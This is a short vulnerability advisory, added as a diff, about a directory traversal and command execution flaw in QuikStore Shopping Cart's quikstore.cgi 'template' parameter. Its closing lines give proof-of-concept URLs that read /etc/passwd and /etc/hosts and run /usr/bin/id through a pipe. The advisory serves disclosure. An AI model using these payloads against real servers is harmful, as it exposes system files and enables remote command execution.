@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/9283/info
+
+It has been reported that QuikStore Shopping Cart may be prone to a directory traversal vulnerability that may allow an attacker to traverse outside the server root directory by using '../' character sequences. The issue exists due to insufficient sanitization of user-supplied data through the 'template' parameter of the 'quikstore.cgi' script. This issue may also allow an attacker to carry out remote command execution by executing the vulnerable script and including malicious shell metacharacters and commands as a value for the 'template' parameter.
+
+Specific vulnerable versions of the software were not identified in the report; therefore it is being assumed that the current version QuikStore Shopping Cart v2.12 is vulnerable to this issue. 
+
+http://www.example.com/quikstore.cgi?category=blah&template=../../../../../../../../../../etc/passwd%00.html
+http://www.example.com/quikstore.cgi?category=blah&template=../../../../../../../../../../../../etc/hosts
+http://www.example.com/quikstore.cgi?category=blah&template=../../../../../../../../../../../../usr/bin/id| 
